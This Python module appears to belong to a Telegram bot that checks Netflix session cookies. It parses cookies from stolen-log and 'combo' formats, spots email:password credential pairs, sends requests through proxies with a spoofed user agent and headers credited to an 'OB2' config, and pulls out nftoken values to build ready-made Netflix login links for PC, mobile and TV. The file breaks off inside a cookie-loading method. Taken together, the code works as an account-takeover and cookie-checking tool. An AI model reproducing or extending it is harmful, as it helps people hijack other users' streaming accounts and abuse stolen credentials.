import hashlib
import html
import json
import logging
import random
import re
import string
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone
from http.cookies import CookieError, SimpleCookie
from urllib.parse import unquote

import requests

from config import CACHE_TTL, CHANNEL_USERNAME, COOKIE_CACHE
from premium_emoji import pe, pe_flag

logger = logging.getLogger(__name__)

NETFLIX_COOKIE_NAMES = (
    'NetflixId',
    'SecureNetflixId',
    'nfvdid',
    'flwssn',
    'memclid',
    'OptanonConsent',
    'profilesNewSession',
)


def _ensure_ascii_cookie_value(value: str) -> str:
    """Ensure cookie value is ASCII; URL-encode if it contains non-ASCII."""
    try:
        value.encode('ascii')
        return value
    except UnicodeEncodeError:
        # URL-encode non-ASCII characters (safe='' encodes everything non-ASCII)
        return urllib.parse.quote(value, safe='')


def extract_nftoken_from_text(text: str) -> str | None:
    """Extract an encoded nftoken query value from a Netflix link or pasted text."""
    match = re.search(r"(?i)(?:[?&]|^)nftoken=([^\s&#<>\"']+)", text.strip())
    if not match:
        return None
    token = html.unescape(match.group(1)).strip()
    return token.rstrip(".,;)'\">]") or None


def _clean_nftoken_candidate(token: object) -> str | None:
    if not isinstance(token, str):
        return None

    cleaned = html.unescape(token).strip().strip("'\"")
    cleaned = cleaned.rstrip(".,;)'\">]")
    if len(cleaned) < 40:
        return None
    if not re.fullmatch(r"[A-Za-z0-9%._~+\-/=]+", cleaned):
        return None
    return cleaned


def _find_token_in_json(value: object) -> str | None:
    if isinstance(value, dict):
        preferred_paths = [
            ("value", "account", "token", "default", "token"),
            ("account", "token", "default", "token"),
        ]
        for path in preferred_paths:
            current = value
            for key in path:
                if not isinstance(current, dict) or key not in current:
                    current = None
                    break
                current = current[key]
            token = _clean_nftoken_candidate(current)
            if token:
                return token

        for key in ("nftoken", "accountToken", "resetToken", "token"):
            token = _clean_nftoken_candidate(value.get(key))
            if token:
                return token

        for item in value.values():
            token = _find_token_in_json(item)
            if token:
                return token

    if isinstance(value, list):
        for item in value:
            token = _find_token_in_json(item)
            if token:
                return token

    return None


def _append_unique_token(tokens: list[str], token: object) -> None:
    cleaned = _clean_nftoken_candidate(token)
    if cleaned and cleaned not in tokens:
        tokens.append(cleaned)


def _collect_tokens_in_json(value: object, tokens: list[str]) -> None:
    if isinstance(value, dict):
        preferred_paths = [
            ("value", "account", "token", "default", "token"),
            ("account", "token", "default", "token"),
        ]
        for path in preferred_paths:
            current = value
            for key in path:
                if not isinstance(current, dict) or key not in current:
                    current = None
                    break
                current = current[key]
            _append_unique_token(tokens, current)

        for key in ("nftoken", "accountToken", "resetToken", "token"):
            _append_unique_token(tokens, value.get(key))

        for item in value.values():
            _collect_tokens_in_json(item, tokens)

    elif isinstance(value, list):
        for item in value:
            _collect_tokens_in_json(item, tokens)


def _tokens_match(left: str | None, right: str | None) -> bool:
    left_clean = _clean_nftoken_candidate(left)
    right_clean = _clean_nftoken_candidate(right)
    if not left_clean or not right_clean:
        return False

    return left_clean == right_clean or unquote(left_clean) == unquote(right_clean)


def _select_new_token(candidates: list[str], old_tokens: list[str]) -> str | None:
    for candidate in candidates:
        if not any(_tokens_match(candidate, old_token) for old_token in old_tokens):
            return candidate
    return None


def extract_tokens_from_response_text(response_text: str) -> list[str]:
    """Extract every NFToken-like value from Netflix JSON, HTML, or embedded JavaScript."""
    tokens: list[str] = []
    if not response_text:
        return tokens

    for match in re.finditer(r"(?i)(?:[?&]|^)nftoken=([^\s&#<>\"']+)", response_text):
        _append_unique_token(tokens, html.unescape(match.group(1)).rstrip(".,;)'\">]"))

    try:
        _collect_tokens_in_json(json.loads(response_text), tokens)
    except json.JSONDecodeError:
        pass
    except TypeError:
        pass

    token_patterns = [
        r'(?i)["\']nftoken["\']\s*[:=]\s*["\']([^"\']+)["\']',
        r'(?i)accountToken\s*[:=]\s*["\']([^"\']+)["\']',
        r'(?i)["\']accountToken["\']\s*:\s*["\']([^"\']+)["\']',
        r'(?i)resetToken\s*[:=]\s*["\']([^"\']+)["\']',
        r'(?i)["\']resetToken["\']\s*:\s*["\']([^"\']+)["\']',
        r'(?i)["\']token["\']\s*:\s*["\']([^"\']+)["\']',
        r'(?i)<meta[^>]+nftoken[^>]+content=["\']([^"\']+)["\']',
    ]
    for pattern in token_patterns:
        for match in re.finditer(pattern, response_text):
            _append_unique_token(tokens, match.group(1))

    return tokens


def extract_token_from_response_text(response_text: str) -> str | None:
    """Extract an NFToken from Netflix JSON, HTML, or embedded JavaScript."""
    tokens = extract_tokens_from_response_text(response_text)
    return tokens[0] if tokens else None


def extract_netflix_url_from_text(text: str) -> str | None:
    """Extract the first Netflix URL from a pasted message."""
    match = re.search(r'https?://(?:www\.)?netflix\.com/[^\s<>"\']+', text.strip(), re.IGNORECASE)
    if not match:
        return None
    return html.unescape(match.group(0)).rstrip(".,;)'\">]")


def normalize_nftoken(token: str) -> str:
    """Keep already-encoded tokens intact while safely encoding raw token characters."""
    return urllib.parse.quote(token.strip(), safe="%")


def build_nftoken_login_urls(token: str) -> dict[str, str]:
    encoded_token = normalize_nftoken(token)
    return {
        "pc": f"https://www.netflix.com/account?nftoken={encoded_token}",
        "mobile": f"https://www.netflix.com/unsupported?nftoken={encoded_token}",
        "tv": f"https://www.netflix.com/tv9?nftoken={encoded_token}",
    }


COUNTRY_FLAGS = {
    "AF": ("🇦🇫", "Afghanistan"),
    "AX": ("🇦🇽", "Åland Islands"),
    "AL": ("🇦🇱", "Albania"),
    "DZ": ("🇩🇿", "Algeria"),
    "AS": ("🇦🇸", "American Samoa"),
    "AD": ("🇦🇩", "Andorra"),
    "AO": ("🇦🇴", "Angola"),
    "AI": ("🇦🇮", "Anguilla"),
    "AQ": ("🇦🇶", "Antarctica"),
    "AG": ("🇦🇬", "Antigua & Barbuda"),
    "AR": ("🇦🇷", "Argentina"),
    "AM": ("🇦🇲", "Armenia"),
    "AW": ("🇦🇼", "Aruba"),
    "AU": ("🇦🇺", "Australia"),
    "AT": ("🇦🇹", "Austria"),
    "AZ": ("🇦🇿", "Azerbaijan"),
    "BS": ("🇧🇸", "Bahamas"),
    "BH": ("🇧🇭", "Bahrain"),
    "BD": ("🇧🇩", "Bangladesh"),
    "BB": ("🇧🇧", "Barbados"),
    "BY": ("🇧🇾", "Belarus"),
    "BE": ("🇧🇪", "Belgium"),
    "BZ": ("🇧🇿", "Belize"),
    "BJ": ("🇧🇯", "Benin"),
    "BM": ("🇧🇲", "Bermuda"),
    "BT": ("🇧🇹", "Bhutan"),
    "BO": ("🇧🇴", "Bolivia"),
    "BA": ("🇧🇦", "Bosnia & Herzegovina"),
    "BW": ("🇧🇼", "Botswana"),
    "BV": ("🇧🇻", "Bouvet Island"),
    "BR": ("🇧🇷", "Brazil"),
    "IO": ("🇮🇴", "British Indian Ocean Territory"),
    "VG": ("🇻🇬", "British Virgin Islands"),
    "BN": ("🇧🇳", "Brunei"),
    "BG": ("🇧🇬", "Bulgaria"),
    "BF": ("🇧🇫", "Burkina Faso"),
    "BI": ("🇧🇮", "Burundi"),
    "KH": ("🇰🇭", "Cambodia"),
    "CM": ("🇨🇲", "Cameroon"),
    "CA": ("🇨🇦", "Canada"),
    "IC": ("🇮🇨", "Canary Islands"),
    "CV": ("🇨🇻", "Cape Verde"),
    "BQ": ("🇧🇶", "Caribbean Netherlands"),
    "KY": ("🇰🇾", "Cayman Islands"),
    "CF": ("🇨🇫", "Central African Republic"),
    "EA": ("🇪🇦", "Ceuta & Melilla"),
    "TD": ("🇹🇩", "Chad"),
    "CL": ("🇨🇱", "Chile"),
    "CN": ("🇨🇳", "China"),
    "CX": ("🇨🇽", "Christmas Island"),
    "CP": ("🇨🇵", "Clipperton Island"),
    "CC": ("🇨🇨", "Cocos (Keeling) Islands"),
    "CO": ("🇨🇴", "Colombia"),
    "KM": ("🇰🇲", "Comoros"),
    "CG": ("🇨🇬", "Congo - Brazzaville"),
    "CD": ("🇨🇩", "Congo - Kinshasa"),
    "CK": ("🇨🇰", "Cook Islands"),
    "CR": ("🇨🇷", "Costa Rica"),
    "CI": ("🇨🇮", "Côte d’Ivoire"),
    "HR": ("🇭🇷", "Croatia"),
    "CU": ("🇨🇺", "Cuba"),
    "CW": ("🇨🇼", "Curaçao"),
    "CY": ("🇨🇾", "Cyprus"),
    "CZ": ("🇨🇿", "Czechia"),
    "DK": ("🇩🇰", "Denmark"),
    "DG": ("🇩🇬", "Diego Garcia"),
    "DJ": ("🇩🇯", "Djibouti"),
    "DM": ("🇩🇲", "Dominica"),
    "DO": ("🇩🇴", "Dominican Republic"),
    "EC": ("🇪🇨", "Ecuador"),
    "EG": ("🇪🇬", "Egypt"),
    "SV": ("🇸🇻", "El Salvador"),
    "GQ": ("🇬🇶", "Equatorial Guinea"),
    "ER": ("🇪🇷", "Eritrea"),
    "EE": ("🇪🇪", "Estonia"),
    "SZ": ("🇸🇿", "Eswatini"),
    "ET": ("🇪🇹", "Ethiopia"),
    "EU": ("🇪🇺", "European Union"),
    "FK": ("🇫🇰", "Falkland Islands"),
    "FO": ("🇫🇴", "Faroe Islands"),
    "FJ": ("🇫🇯", "Fiji"),
    "FI": ("🇫🇮", "Finland"),
    "FR": ("🇫🇷", "France"),
    "GF": ("🇬🇫", "French Guiana"),
    "PF": ("🇵🇫", "French Polynesia"),
    "TF": ("🇹🇫", "French Southern Territories"),
    "GA": ("🇬🇦", "Gabon"),
    "GM": ("🇬🇲", "Gambia"),
    "GE": ("🇬🇪", "Georgia"),
    "DE": ("🇩🇪", "Germany"),
    "GH": ("🇬🇭", "Ghana"),
    "GI": ("🇬🇮", "Gibraltar"),
    "GR": ("🇬🇷", "Greece"),
    "GL": ("🇬🇱", "Greenland"),
    "GD": ("🇬🇩", "Grenada"),
    "GP": ("🇬🇵", "Guadeloupe"),
    "GU": ("🇬🇺", "Guam"),
    "GT": ("🇬🇹", "Guatemala"),
    "GG": ("🇬🇬", "Guernsey"),
    "GN": ("🇬🇳", "Guinea"),
    "GW": ("🇬🇼", "Guinea-Bissau"),
    "GY": ("🇬🇾", "Guyana"),
    "HT": ("🇭🇹", "Haiti"),
    "HM": ("🇭🇲", "Heard & McDonald Islands"),
    "HN": ("🇭🇳", "Honduras"),
    "HK": ("🇭🇰", "Hong Kong SAR China"),
    "HU": ("🇭🇺", "Hungary"),
    "IS": ("🇮🇸", "Iceland"),
    "IN": ("🇮🇳", "India"),
    "ID": ("🇮🇩", "Indonesia"),
    "IR": ("🇮🇷", "Iran"),
    "IQ": ("🇮🇶", "Iraq"),
    "IE": ("🇮🇪", "Ireland"),
    "IM": ("🇮🇲", "Isle of Man"),
    "IL": ("🇮🇱", "Israel"),
    "IT": ("🇮🇹", "Italy"),
    "JM": ("🇯🇲", "Jamaica"),
    "JP": ("🇯🇵", "Japan"),
    "JE": ("🇯🇪", "Jersey"),
    "JO": ("🇯🇴", "Jordan"),
    "KZ": ("🇰🇿", "Kazakhstan"),
    "KE": ("🇰🇪", "Kenya"),
    "KI": ("🇰🇮", "Kiribati"),
    "XK": ("🇽🇰", "Kosovo"),
    "KW": ("🇰🇼", "Kuwait"),
    "KG": ("🇰🇬", "Kyrgyzstan"),
    "LA": ("🇱🇦", "Laos"),
    "LV": ("🇱🇻", "Latvia"),
    "LB": ("🇱🇧", "Lebanon"),
    "LS": ("🇱🇸", "Lesotho"),
    "LR": ("🇱🇷", "Liberia"),
    "LY": ("🇱🇾", "Libya"),
    "LI": ("🇱🇮", "Liechtenstein"),
    "LT": ("🇱🇹", "Lithuania"),
    "LU": ("🇱🇺", "Luxembourg"),
    "MO": ("🇲🇴", "Macau SAR China"),
    "MG": ("🇲🇬", "Madagascar"),
    "MW": ("🇲🇼", "Malawi"),
    "MY": ("🇲🇾", "Malaysia"),
    "MV": ("🇲🇻", "Maldives"),
    "ML": ("🇲🇱", "Mali"),
    "MT": ("🇲🇹", "Malta"),
    "MH": ("🇲🇭", "Marshall Islands"),
    "MQ": ("🇲🇶", "Martinique"),
    "MR": ("🇲🇷", "Mauritania"),
    "MU": ("🇲🇺", "Mauritius"),
    "YT": ("🇾🇹", "Mayotte"),
    "MX": ("🇲🇽", "Mexico"),
    "FM": ("🇫🇲", "Micronesia"),
    "MD": ("🇲🇩", "Moldova"),
    "MC": ("🇲🇨", "Monaco"),
    "MN": ("🇲🇳", "Mongolia"),
    "ME": ("🇲🇪", "Montenegro"),
    "MS": ("🇲🇸", "Montserrat"),
    "MA": ("🇲🇦", "Morocco"),
    "MZ": ("🇲🇿", "Mozambique"),
    "MM": ("🇲🇲", "Myanmar (Burma)"),
    "NA": ("🇳🇦", "Namibia"),
    "NR": ("🇳🇷", "Nauru"),
    "NP": ("🇳🇵", "Nepal"),
    "NL": ("🇳🇱", "Netherlands"),
    "NC": ("🇳🇨", "New Caledonia"),
    "NZ": ("🇳🇿", "New Zealand"),
    "NI": ("🇳🇮", "Nicaragua"),
    "NE": ("🇳🇪", "Niger"),
    "NG": ("🇳🇬", "Nigeria"),
    "NU": ("🇳🇺", "Niue"),
    "NF": ("🇳🇫", "Norfolk Island"),
    "KP": ("🇰🇵", "North Korea"),
    "MK": ("🇲🇰", "North Macedonia"),
    "MP": ("🇲🇵", "Northern Mariana Islands"),
    "NO": ("🇳🇴", "Norway"),
    "OM": ("🇴🇲", "Oman"),
    "PK": ("🇵🇰", "Pakistan"),
    "PW": ("🇵🇼", "Palau"),
    "PS": ("🇵🇸", "Palestinian Territories"),
    "PA": ("🇵🇦", "Panama"),
    "PG": ("🇵🇬", "Papua New Guinea"),
    "PY": ("🇵🇾", "Paraguay"),
    "PE": ("🇵🇪", "Peru"),
    "PH": ("🇵🇭", "Philippines"),
    "PN": ("🇵🇳", "Pitcairn Islands"),
    "PL": ("🇵🇱", "Poland"),
    "PT": ("🇵🇹", "Portugal"),
    "PR": ("🇵🇷", "Puerto Rico"),
    "QA": ("🇶🇦", "Qatar"),
    "RE": ("🇷🇪", "Réunion"),
    "RO": ("🇷🇴", "Romania"),
    "RU": ("🇷🇺", "Russia"),
    "RW": ("🇷🇼", "Rwanda"),
    "WS": ("🇼🇸", "Samoa"),
    "SM": ("🇸🇲", "San Marino"),
    "ST": ("🇸🇹", "São Tomé & Príncipe"),
    "SA": ("🇸🇦", "Saudi Arabia"),
    "SN": ("🇸🇳", "Senegal"),
    "RS": ("🇷🇸", "Serbia"),
    "SC": ("🇸🇨", "Seychelles"),
    "SL": ("🇸🇱", "Sierra Leone"),
    "SG": ("🇸🇬", "Singapore"),
    "SX": ("🇸🇽", "Sint Maarten"),
    "SK": ("🇸🇰", "Slovakia"),
    "SI": ("🇸🇮", "Slovenia"),
    "SB": ("🇸🇧", "Solomon Islands"),
    "SO": ("🇸🇴", "Somalia"),
    "ZA": ("🇿🇦", "South Africa"),
    "GS": ("🇬🇸", "South Georgia & South Sandwich Islands"),
    "KR": ("🇰🇷", "South Korea"),
    "SS": ("🇸🇸", "South Sudan"),
    "ES": ("🇪🇸", "Spain"),
    "LK": ("🇱🇰", "Sri Lanka"),
    "BL": ("🇧🇱", "St. Barthélemy"),
    "SH": ("🇸🇭", "St. Helena"),
    "KN": ("🇰🇳", "St. Kitts & Nevis"),
    "LC": ("🇱🇨", "St. Lucia"),
    "MF": ("🇲🇫", "St. Martin"),
    "PM": ("🇵🇲", "St. Pierre & Miquelon"),
    "VC": ("🇻🇨", "St. Vincent & Grenadines"),
    "SD": ("🇸🇩", "Sudan"),
    "SR": ("🇸🇷", "Suriname"),
    "SJ": ("🇸🇯", "Svalbard & Jan Mayen"),
    "SE": ("🇸🇪", "Sweden"),
    "CH": ("🇨🇭", "Switzerland"),
    "SY": ("🇸🇾", "Syria"),
    "TW": ("🇹🇼", "Taiwan"),
    "TJ": ("🇹🇯", "Tajikistan"),
    "TZ": ("🇹🇿", "Tanzania"),
    "TH": ("🇹🇭", "Thailand"),
    "TL": ("🇹🇱", "Timor-Leste"),
    "TG": ("🇹🇬", "Togo"),
    "TK": ("🇹🇰", "Tokelau"),
    "TO": ("🇹🇴", "Tonga"),
    "TT": ("🇹🇹", "Trinidad & Tobago"),
    "AC": ("🇦🇨", "Tristan da Cunha"),
    "TN": ("🇹🇳", "Tunisia"),
    "TR": ("🇹🇷", "Turkey"),
    "TM": ("🇹🇲", "Turkmenistan"),
    "TC": ("🇹🇨", "Turks & Caicos Islands"),
    "TV": ("🇹🇻", "Tuvalu"),
    "UG": ("🇺🇬", "Uganda"),
    "UA": ("🇺🇦", "Ukraine"),
    "AE": ("🇦🇪", "United Arab Emirates"),
    "GB": ("🇬🇧", "United Kingdom"),
    "UN": ("🇺🇳", "United Nations"),
    "US": ("🇺🇸", "United States"),
    "UY": ("🇺🇾", "Uruguay"),
    "UM": ("🇺🇲", "U.S. Outlying Islands"),
    "VI": ("🇻🇳", "U.S. Virgin Islands"),
    "UZ": ("🇺🇿", "Uzbekistan"),
    "VU": ("🇻🇺", "Vanuatu"),
    "VA": ("🇻🇦", "Vatican City"),
    "VE": ("🇻🇪", "Venezuela"),
    "VN": ("🇻🇳", "Vietnam"),
    "WF": ("🇼🇫", "Wallis & Futuna"),
    "EH": ("🇪🇭", "Western Sahara"),
    "YE": ("🇾🇪", "Yemen"),
    "ZM": ("🇿🇲", "Zambia"),
    "ZW": ("🇿🇼", "Zimbabwe"),
}


def decode_unicode_escapes(text):
    """Decode unicode escape sequences in text"""
    if not text or text == 'N/A':
        return text
    try:
        # Handle \u and \x escapes
        if '\\u' in text or '\\x' in text:
            return text.encode('latin-1').decode('unicode-escape')
        return text
    except (UnicodeError, AttributeError):
        return text


def get_country_display(country_code, premium: bool = False):
    """Get flag and full country name from country code.

    premium=True returns Telegram custom emoji HTML for chat messages.
    premium=False keeps plain text output clean for exported files.
    """
    code = str(country_code or "").strip().upper()
    if code in COUNTRY_FLAGS:
        flag, name = COUNTRY_FLAGS[code]
        if premium:
            return f"{html.escape(name)} {pe_flag(code, flag)}"
        return f"{name} {flag}"
    return html.escape(str(country_code)) if premium else str(country_code)


def parse_cookie_string(cookie_string):
    """Parse a cookie string into a dictionary"""
    cookies = {}
    for cookie in cookie_string.split(';'):
        cookie = cookie.strip()
        if '=' in cookie:
            name, value = cookie.split('=', 1)
            cookies[name] = value
    return cookies


def convert_netscape_to_header_string(cookie_string):
    """Convert Netscape format cookies to header string format, based on reference logic."""
    try:
        lines = cookie_string.strip().split('\n')
        cookies = []

        for line in lines:
            line = line.strip()
            # Skip comments and empty lines, but allow #HttpOnly_
            if not line or (line.startswith('#') and not line.startswith('#HttpOnly_')):
                continue

            # Handle HttpOnly prefix
            if line.startswith('#HttpOnly_'):
                line = line[len('#HttpOnly_'):]

            # Split by any whitespace (tabs or spaces)
            parts = re.split(r'\s+', line, maxsplit=6)
            if len(parts) < 7:
                continue

            domain = parts[0].lower()
            include_subdomains = parts[1].upper()
            secure_flag = parts[3].upper()
            if 'netflix.com' not in domain:
                continue
            if include_subdomains not in {'TRUE', 'FALSE'} or secure_flag not in {'TRUE', 'FALSE'}:
                continue

            name = parts[5]
            value = parts[6]
            cookies.append(f"{name}={value}")

        return '; '.join(cookies) if cookies else None
    except (AttributeError, IndexError, re.error) as e:
        logger.error(f"Error converting Netscape to header string: {e}")
        return None


def _clean_cookie_candidate(candidate: object) -> str:
    """Normalize copied/exported cookie text without changing cookie values."""
    cleaned = html.unescape(str(candidate or "")).strip()
    cleaned = cleaned.replace("\\u003d", "=").replace("\\u003D", "=")
    cleaned = cleaned.replace("\\u003b", ";").replace("\\u003B", ";")
    cleaned = cleaned.replace("\\073", ";")
    cleaned = cleaned.replace("\\n", "\n").replace("\\r", "\r").replace("\\t", "\t")

    if not cleaned.startswith(('{', '[')):
        cleaned = re.sub(r"(?i)^\s*(?:-H\s+)?['\"]?(?:cookies?|cookie_string|cookieString)\s*[:=]\s*", "", cleaned)
        cleaned = re.sub(r"(?i)^\s*document\.cookie\s*=\s*", "", cleaned)
        cleaned = re.sub(r"(?i)^\s*--cookie(?:-raw)?\s+", "", cleaned)
        cleaned = cleaned.strip()

        while len(cleaned) >= 2 and cleaned[0] == cleaned[-1] and cleaned[0] in ("'", '"', "`"):
            cleaned = cleaned[1:-1].strip()

        cleaned = cleaned.strip("<> \t\r\n")
        cleaned = cleaned.rstrip("`'\",)]}").strip()

    return cleaned


def _add_cookie_candidate(candidates: list[str], candidate: object) -> None:
    cleaned = _clean_cookie_candidate(candidate)
    if cleaned and cleaned not in candidates:
        candidates.append(cleaned)


def _cookie_candidate_score(candidate: str) -> tuple[int, int]:
    known_count = sum(
        1
        for cookie_name in NETFLIX_COOKIE_NAMES
        if re.search(rf'(?i)(?:^|[;\s])#?{re.escape(cookie_name)}\s*[=:]', candidate)
    )
    starts_with_cookie = any(
        re.match(rf'(?i)^\s*{re.escape(cookie_name)}\s*[=:]', candidate)
        for cookie_name in NETFLIX_COOKIE_NAMES
    )

    noise = 0
    if ' | ' in candidate or ' || ' in candidate:
        noise += 4
    if re.search(r"(?i)\b(?:curl|user-agent|accept|authorization|host)\b", candidate):
        noise += 5
    if re.search(r'[\w.+-]+@[\w.-]+:', candidate):
        noise += 3
    if candidate.startswith(('{', '[')):
        noise += 2

    return (-known_count, 0 if starts_with_cookie else 1, noise, len(candidate))


def _cookie_pair_from_json_object(value: dict) -> str | None:
    if 'name' not in value or 'value' not in value:
        return None

    name = str(value.get('name', '')).strip()
    cookie_value = str(value.get('value', '')).strip()
    if not name:
        return None

    return f"{name}={cookie_value}"


def _json_cookie_candidates(value: object) -> list[str]:
    candidates: list[str] = []

    def walk(node: object) -> None:
        if isinstance(node, str):
            if any(cookie_name in node for cookie_name in NETFLIX_COOKIE_NAMES) or 'cookie:' in node.lower():
                _add_cookie_candidate(candidates, node)
            return

        if isinstance(node, list):
            pairs = []
            for item in node:
                if isinstance(item, dict):
                    pair = _cookie_pair_from_json_object(item)
                    if pair:
                        pairs.append(pair)
            if pairs:
                _add_cookie_candidate(candidates, '; '.join(pairs))

            for item in node:
                walk(item)
            return

        if not isinstance(node, dict):
            return

        pair = _cookie_pair_from_json_object(node)
        if pair:
            _add_cookie_candidate(candidates, pair)

        for key, item in node.items():
            key_lower = str(key).lower()

            if isinstance(item, str) and key_lower in {
                'cookie',
                'cookies',
                'cookiestring',
                'cookie_string',
                'cookieheader',
                'cookie_header',
            }:
                _add_cookie_candidate(candidates, item)

            if key_lower in {'headers', 'requestheaders', 'responseheaders'}:
                if isinstance(item, dict):
                    for header_name, header_value in item.items():
                        header_name_lower = str(header_name).lower()
                        if header_name_lower in {'cookie', 'set-cookie'} and isinstance(header_value, str):
                            _add_cookie_candidate(candidates, f"{header_name}: {header_value}")
                elif isinstance(item, list):
                    for header in item:
                        if isinstance(header, dict):
                            header_name = str(header.get('name', '')).lower()
                            header_value = header.get('value')
                            if header_name in {'cookie', 'set-cookie'} and isinstance(header_value, str):
                                _add_cookie_candidate(candidates, f"{header.get('name')}: {header_value}")

            walk(item)

    walk(value)
    return candidates


def get_cookie_candidates(line: str) -> list[str]:
    """
    Extracts potential cookie strings from a line using multiple patterns.
    Returns a list of unique candidates to try.
    """
    candidates = []
    line = line.strip()
    if not line:
        return []

    netscape_header = convert_netscape_to_header_string(line)
    if netscape_header:
        _add_cookie_candidate(candidates, netscape_header)

    if line.startswith(('{', '[')):
        try:
            for candidate in _json_cookie_candidates(json.loads(line)):
                _add_cookie_candidate(candidates, candidate)
        except (json.JSONDecodeError, TypeError, ValueError):
            pass

    # 1. Exact Match / Raw Line (High priority if it looks like a cookie)
    # Check for known keys anywhere in the string
    if any(k in line for k in NETFLIX_COOKIE_NAMES):
        # If it's a raw key-value string (simple or complex)
        _add_cookie_candidate(candidates, line)

    # 2. Regex Patterns for "Cookie: value" or "Cookie = value" or "| Cookie"
    # These handle cases where the cookie is prefixed by log format text
    patterns = [
        r'[Cc]ookies?\s*[:=]\s*([^\n|]+)',  # cookie: ..., cookies = ...
        r'[Cc]ookie\s*[:=]\s*([^\n|]+)',
        r'\|\s*[Cc]ookies?\s*[:=]\s*([^\n]+)', # | cookie = ...
        r'Cookies?\s*:\s*([^\n]+)',
        r'["\']cookies?["\']\s*:\s*["\']([^"\']+)["\']',
        r'["\']Cookie["\']\s*:\s*["\']([^"\']+)["\']',
        r'(?i)\bSet-Cookie\s*:\s*([^\'"`\r\n]+)',
        r'(?i)\bCookie\s*:\s*([^\'"`\r\n]+)',
        r'(?i)--cookie(?:-raw)?\s+["\']?([^"\']+)',
        r'(?i)document\.cookie\s*=\s*["\']([^"\']+)["\']',
    ]

    for pattern in patterns:
        match = re.search(pattern, line, re.IGNORECASE)
        if match:
            _add_cookie_candidate(candidates, match.group(1))

    # 3. Key-based extraction (find start of NetflixId and take till end or separator)
    # This is very robust for "Combo | Cookie" formats
    keys = ['NetflixId=', 'SecureNetflixId=', 'nfvdid=', 'NetflixId:', 'SecureNetflixId:', 'nfvdid:']
    for key in keys:
        if key in line:
            start_pos = line.find(key)
            # Take from key to end
            candidate = line[start_pos:]
            # Trim common suffixes if present
            for sep in [' | ', ' || ', '\n', '\r', ' #', ' //', '\t', " -H ", " Set-Cookie:"]:
                if sep in candidate:
                    candidate = candidate.split(sep)[0]

            _add_cookie_candidate(candidates, candidate)

    for match in re.finditer(
        r'(?i)(?:NetflixId|SecureNetflixId|nfvdid|flwssn|memclid|OptanonConsent|profilesNewSession)\s*[:=]',
        line,
    ):
        candidate = line[match.start():]
        for sep in [' | ', ' || ', '\n', '\r', ' #', ' //', '\t', " -H ", " Set-Cookie:"]:
            if sep in candidate:
                candidate = candidate.split(sep)[0]
        _add_cookie_candidate(candidates, candidate)

    # 4. JSON detection
    if line.startswith('{') or line.startswith('['):
        _add_cookie_candidate(candidates, line)

    return sorted(candidates, key=_cookie_candidate_score)


def extract_cookie_from_line(line: str) -> str:
    """
    Legacy wrapper for compatibility, returns the first best candidate or original line.
    Used only where iteration isn't implemented (fallback).
    """
    candidates = get_cookie_candidates(line)
    return candidates[0] if candidates else line


def get_cached_result(cookie_string):
    """Retrieve result from memory cache, ignoring stale 'Invalid' entries."""
    try:
        if not cookie_string:
            return None
        cookie_hash = hashlib.md5(cookie_string.encode()).hexdigest()
        if cookie_hash in COOKIE_CACHE:
            timestamp, result = COOKIE_CACHE[cookie_hash]
            if time.time() - timestamp < CACHE_TTL:
                # Do not return cached result if it is 'Invalid' (likely from transient error)
                if result.get('status') != 'Invalid':
                    return result
                else:
                    # Optionally delete to free memory
                    del COOKIE_CACHE[cookie_hash]
            else:
                del COOKIE_CACHE[cookie_hash]
    except (TypeError, UnicodeError) as e:
        logger.error(f"Cache get error: {e}")
    return None


def set_cached_result(cookie_string, result):
    """Save result to memory cache"""
    try:
        if not cookie_string:
            return
        cookie_hash = hashlib.md5(cookie_string.encode()).hexdigest()
        COOKIE_CACHE[cookie_hash] = (time.time(), result)
    except (TypeError, UnicodeError) as e:
        logger.error(f"Cache set error: {e}")


class NetflixAccountInfoExtractor:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        self.proxy = proxy
        if self.proxy:
            self.session.proxies = {
                "http": proxy,
                "https": proxy
            }

        # Headers based on your OB2 config
        self.user_agent = 'Mozilla/5.0 (Linux; Android 8.0; SM-G955U) AppleWebKit/5.37.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36'
        self.session.headers.update({
            'User-Agent': self.user_agent,
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'fr-FR,fr;q=0.9',
            'Connection': 'keep-alive',
            'X-Requested-With': 'XMLHttpRequest'
        })

        # Account information storage
        self.account_data = {}
        self.payment_info = {}
        self.nftoken_info = {}
        self.credentials_found = None

    def _get(self, url, *, retries=3, timeout=30, **kwargs):
        """GET with small backoff for transient Netflix/network failures."""
        retry_statuses = {408, 425, 429, 500, 502, 503, 504}
        for attempt in range(retries):
            try:
                response = self.session.get(url, timeout=timeout, **kwargs)
                if response.status_code in retry_statuses and attempt < retries - 1:
                    retry_after = response.headers.get("Retry-After")
                    try:
                        delay = float(retry_after) if retry_after else 1.5 * (attempt + 1)
                    except ValueError:
                        delay = 1.5 * (attempt + 1)
                    logger.warning("Netflix returned HTTP %s for %s; retrying in %.1fs", response.status_code, url, delay)
                    time.sleep(min(delay, 8))
                    continue
                return response
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as exc:
                if attempt >= retries - 1:
                    raise
                delay = 1.5 * (attempt + 1)
                logger.warning("Netflix request timeout/network error for %s: %s; retrying in %.1fs", url, exc, delay)
                time.sleep(min(delay, 8))

    def detect_email_password(self, text):
        """Detect email:password pattern"""
        try:
            # Look for email:password pattern
            # Pattern: non-space chars @ non-space chars . non-space chars : non-space chars
            match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}:[^\s|]+)', text)
            if match:
                self.credentials_found = match.group(1)
                logger.info("Found credentials in input; redacted from logs")
        except (TypeError, re.error) as e:
            logger.error(f"Credential detection error: {e}")

    def load_cookies_from_input(self, cookie_input):
        """Intelligently load cookies from various text formats into the session."""
        cookie_input = _clean_cookie_candidate(cookie_input)

        # Handle Colon separator for NetflixId
        if "NetflixId:" in cookie_input:
            cookie_input = cookie_input.replace("NetflixId:", "NetflixId=")
        if "SecureNetflixId:" in cookie_input:
            cookie_input = cookie_input.replace("SecureNetflixId:", "SecureNetflixId=")
        if "nfvdid:" in cookie_input:
            cookie_input = cookie_input.replace("nfvdid:", "nfvdid=")

        self.detect_email_password(cookie_input)

        # Try loading as JSON
        if cookie_input.startswith(('{', '[')):
            try:
                cookie_json = json.loads(cookie_input)
                if self.load_cookies_from_json(cookie_json):
                    logger.info("Loaded cookies as JSON.")
                    return "JSON"
            except json.JSONDecodeError:
                pass  # Fallback to string

